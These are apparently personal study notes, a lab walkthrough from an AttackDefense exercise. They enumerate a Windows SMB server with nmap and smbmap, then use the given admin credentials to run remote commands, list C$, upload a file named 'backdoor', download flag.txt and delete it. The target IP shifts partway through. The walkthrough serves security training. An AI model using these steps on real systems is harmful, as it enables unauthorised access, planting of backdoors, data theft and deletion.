#### [SMBMap](https://github.com/ShawnDEvans/smbmap)

- Allows users to enumerate samba share
- Allows file upload/download/delete
- Permission enumeration (writable share, meet Metasploit)
**Objective:** Enumerate the target machine SMB service using the smbmap tool and discover the flag.

The following username and password may be used to access the service:
| Username | Password | | administrator | smbserver_771 |

`ris:PriceTag3` [[Servers and Services#SMB]] [[Hack2.0/NMAP|NMAP]]
`ris:Tools` [[SMBMap]]

Target : 10.5.25.162

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.25.162
PING 10.5.25.162 (10.5.25.162) 56(84) bytes of data.
64 bytes from 10.5.25.162: icmp_seq=1 ttl=125 time=2.08 ms
64 bytes from 10.5.25.162: icmp_seq=2 ttl=125 time=1.81 ms
64 bytes from 10.5.25.162: icmp_seq=3 ttl=125 time=1.68 ms
64 bytes from 10.5.25.162: icmp_seq=4 ttl=125 time=1.44 ms
64 bytes from 10.5.25.162: icmp_seq=5 ttl=125 time=1.68 ms

--- 10.5.25.162 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.440/1.736/2.078/0.208 ms
```

[[Hack2.0/NMAP#General Scan|NMAP General scan]]

```
root@attackdefense:~# nmap 10.5.25.162
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-07 13:11 IST
Nmap scan report for 10.5.25.162
Host is up (0.0016s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown
49176/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds
```

[[Hack2.0/NMAP#Service version|NMAP Service versioning]]

```
root@attackdefense:~# nmap -p445 -A 10.5.25.162
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-07 13:13 IST
Nmap scan report for 10.5.25.162
Host is up (0.0017s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 8.1 (97%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows Server 2008 R2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: smbserver
|   NetBIOS computer name: SMBSERVER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-07T07:43:35+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-07T07:43:37
|_  start_date: 2023-07-07T07:31:27

TRACEROUTE (using port 445/tcp)
HOP RTT     ADDRESS
1   0.02 ms linux (10.10.12.1)
2   ...
3   1.71 ms 10.5.25.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

[[Hack2.0/NMAP#Specific script|NMAP script]]

```
root@attackdefense:~# nmap -p445 --script smb-protocols 10.5.25.162
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-07 13:13 IST
Nmap scan report for 10.5.25.162
Host is up (0.0018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02

Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```

[[Hack2.0/SMBMap#Null session|SMBMap]]

```
root@attackdefense:~# smbmap -u guest -p "" -H 10.5.25.162
[+] Guest session   	IP: 10.5.25.162:445	Name: 10.5.25.162                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C                                                 	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	D$                                                	NO ACCESS	Default share
	Documents                                         	NO ACCESS	
	Downloads                                         	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ ONLY	Printer Drivers
```

But as we can see we only the read only access, incase if we want to much more we might have to consider logging in using the credentials.

[[Hack2.0/SMBMap#Logging in|SMBMap Login]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.25.162
[+] IP: 10.5.25.162:445	Name: 10.5.25.162                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers
```

[[Hack2.0/SMBMap#Running a command|SMBMap Command execution]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.25.162 -x ipconfig
                                
Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::4438:3cde:b851:e1ec%12
   IPv4 Address. . . . . . . . . . . : 10.5.25.162
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.5.16.1

Tunnel adapter isatap.ap-south-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
```

[[Hack2.0/SMBMap#List the drives|SMBMap drive listing]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.25.162 -L         
[+] Host 10.5.25.162 Local Drives: C:\ D:\
[+] Host 10.5.25.162 Net Drive(s):
	No mapped network drives
```

[[Hack2.0/SMBMap#Listing the files|SMBMap files list]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.25.162 -r C$
[+] IP: 10.5.25.162:445	Name: 10.5.25.162                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Fri Jul  7 13:01:22 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Fri Jul  7 13:25:43 2023	Windows
```

[[Hack2.0/SMBMap#Uploading file|SMBMap Uploading file]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.18.55 --upload /root/backdoor C$/backdoor
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
```

[[Hack2.0/SMBMap#Downloading file|SMBMap downloading file]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.18.55 --download C$/flag.txt
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.5.18.55-C_flag.txt
```

[[Hack2.0/SMBMap#Deleting file|SMBMap file deletion]]

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -H 10.5.18.55 --delete C$/flag.txt
[+] File successfully deleted: C$\flag.txt
```

